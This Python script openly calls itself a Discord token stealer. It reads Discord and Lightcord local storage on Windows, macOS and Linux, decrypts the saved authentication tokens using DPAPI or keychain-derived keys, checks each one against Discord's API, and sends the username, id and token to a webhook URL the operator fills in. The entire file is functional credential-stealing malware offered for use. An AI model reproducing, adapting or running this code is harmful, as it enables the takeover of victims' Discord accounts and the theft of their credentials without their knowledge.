# PLEASE READ README.md, it will tell you how it works

# GO TO POWERSHELL AND DOWNLOAD THIS
# pip install cryptography
# for the discord token stealer to work!
# created by farmingking

import base64, ctypes, json, os, re, subprocess, sys, time, urllib.request as u
from pathlib import Path
from urllib.error import HTTPError
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes, padding

discordwebhook = "" # <= put your discord webhook here
TK = rb"[A-Za-z0-9_-]{20,32}\.[A-Za-z0-9_-]{6,7}\.[A-Za-z0-9_-]{25,50}"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"

class B(ctypes.Structure): _fields_ = [("n", ctypes.c_uint32), ("p", ctypes.POINTER(ctypes.c_char))]

def dp(d):
    b = ctypes.create_string_buffer(d, len(d)); i = B(len(d), ctypes.cast(b, ctypes.POINTER(ctypes.c_char))); o = B()
    if not ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(i), None, None, None, None, 0, ctypes.byref(o)): raise ctypes.WinError()
    return ctypes.string_at(o.p, o.n)

def kd(s): return PBKDF2HMAC(algorithm=hashes.SHA1(), length=16, salt=b"saltysalt", iterations=1003).derive(s.encode())

def gk(a):
    if sys.platform == "win32": return dp(base64.b64decode(json.loads((a / "Local State").read_text())["os_crypt"]["encrypted_key"])[5:]), 1
    if sys.platform == "darwin": return kd(subprocess.run(["security", "find-generic-password", "-w", "-s", a.name.title() + " Safe Storage"], capture_output=True, text=True).stdout.strip()), 0
    return kd("peanuts"), 0

def dec(b, k, g):
    if b[:3] in (b"v10", b"v11"):
        d = b[3:]
        try:
            if g: b = AESGCM(k).decrypt(d[:12], d[12:-16] + d[-16:], None)
            else:
                c = Cipher(algorithms.AES(k), modes.CBC(b" " * 16)).decryptor(); p = padding.PKCS7(128).unpadder()
                b = p.update(c.update(d) + c.finalize()) + p.finalize()
        except: return
    x = re.search(TK, b); return x and x.group(0).decode()

def bl(r):
    for m in re.finditer(rb"dQw4w9WgXcQ:", r):
        s = re.match(rb"[A-Za-z0-9+/=]+", r[m.end():m.end() + 512].replace(b"\x00", b""))
        if s:
            s = s.group(0) + b"=" * (-len(s.group(0)) % 4)
            try: yield base64.b64decode(s)
            except: pass
    for m in re.finditer(TK, r.replace(b"\x00", b"")): yield m.group(0)

def rd(p): return b"".join(f.read_bytes() for f in sorted(p.iterdir(), key=lambda f: f.stat().st_mtime, reverse=True) if f.suffix in (".ldb", ".log", ".sst") and f.is_file())

def who(t):
    q = u.Request("https://discord.com/api/v10/users/@me", headers={"Authorization": t, "User-Agent": UA})
    for _ in range(3):
        try: return json.load(u.urlopen(q, timeout=8))
        except HTTPError as e:
            if e.code == 429: time.sleep(1.5); continue
            return
        except: time.sleep(.6)

def send(j):
    try: u.urlopen(u.Request(discordwebhook, data=json.dumps(j).encode(), headers={"Content-Type": "application/json", "User-Agent": UA}), timeout=10)
    except Exception as e: print(e)

P = {"win32": Path(os.environ.get("APPDATA", "")), "darwin": Path.home() / "Library/Application Support"}.get(sys.platform, Path.home() / ".config")
s, n = set(), 0
for a in ("discord", "discordptb", "discordcanary", "Lightcord"):
    p = P / a / "Local Storage" / "leveldb"
    if not p.is_dir(): continue
    try: k, g = gk(P / a)
    except: continue
    for x in bl(rd(p)):
        t = dec(x, k, g)
        if not t or t in s: continue
        s.add(t); r = who(t)
        if not r: continue
        n += 1; send({"embeds": [{"color": 0x5865f2, "description": f"**{a}** · {r['username']} (`{r['id']}`)\n```{t}```"}]})
    time.sleep(1)

if not n: send({"content": "nothing live"})